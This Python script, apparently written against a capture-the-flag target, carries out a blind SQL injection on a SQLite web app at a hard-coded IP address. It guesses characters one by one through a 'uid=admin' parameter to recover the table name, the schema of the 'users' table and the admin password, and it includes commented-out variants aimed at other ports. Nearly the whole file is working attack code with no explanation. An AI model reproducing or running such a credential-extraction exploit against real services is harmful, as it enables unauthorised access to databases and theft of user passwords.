import requests  

res1=''

for i in range (1,255):
    r1=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20(SELECT%20length(tbl_name)%20FROM%20sqlite_master%20WHERE%20type%3d'table'%20and%20tbl_name%20NOT%20like%20'sqlite_%25')%3d"+str(i)+"--")
    if 'exists' in r1.text:
        length_r1=i
        break
for i in range (1,length_r1+1):
    for j in range(33,126):
        r1=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20(SELECT%20hex(substr(tbl_name%2c"+str(i)+"%2c1))%20FROM%20sqlite_master%20WHERE%20type%3d'table'%20and%20tbl_name%20NOT%20like%20'sqlite_%25')%3dhex(char("+str(j)+"))--")
        if 'exists' in r1.text:
            res1=res1+chr(j)
            print(res1)
            break

res2=''
for i in range (1,255):
    r2=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20(SELECT%20length(sql)%20FROM%20sqlite_master%20WHERE%20type!%3d'meta'%20AND%20sql%20NOT%20NULL%20AND%20name%20%3d'users')%3d"+str(i)+"--")
    if 'exists' in r2.text:
        length_r2=i
        break
for i in range (1,length_r2+1):
    for j in range(33,126):
        r2=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20hex(substr((SELECT%20sql%20FROM%20sqlite_master%20WHERE%20type!%3d'meta'%20AND%20sql%20NOT%20NULL%20AND%20name%20%3d'users')%2c"+str(i)+"%2c1))%3dhex(char("+str(j)+"))--")
        if 'exists' in r2.text:
            res2=res2+chr(j)
            print(res2)
            break

res3=''
for i in range (1,255):
    r3=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20(SELECT%20length(upw)%20FROM%20users%20WHERE%20uid%3d'admin')%3d"+str(i)+"--")
    if 'exists' in r3.text:
        length_r3=i
        break
for i in range (1,length_r3+1):
    for j in range(33,126):
        r3=requests.get("http://13.212.48.18:30807/?uid=admin'%20and%20hex(substr((SELECT%20upw%20from%20users%20where%20uid%3d'admin')%2c"+str(i)+"%2c1))%3dhex(char("+str(j)+"))--")
        if 'exists' in r3.text:
            res3=res3+chr(j)
            print(res3)
            break

        

#r=requests.get("http://13.212.48.18:32259/?uid=admin'%20and%20(SELECT%20hex(substr(tbl_name%2c"+str(i)+"%2c1))%20FROM%20sqlite_master%20WHERE%20type%3d'table'%20and%20tbl_name%20NOT%20like%20'sqlite_%25')%3dhex('"+char+"')--")
#r=requests.get("http://13.212.48.18:32259/?uid=admin'%20and%20hex(substr((SELECT%20sql%20FROM%20sqlite_master%20WHERE%20type!%3d'meta'%20AND%20sql%20NOT%20NULL%20AND%20name%20%3d'users')%2c"+str(i)+"%2c1))%3dhex('"+char+"')--")
#r=requests.get("http://13.212.48.18:31758/?uid=admin'%20and%20hex(substr((SELECT%20upw%20from%20users%20where%20uid%3d'admin')%2c"+str(i)+"%2c1))%3dhex('"+char+"')--")
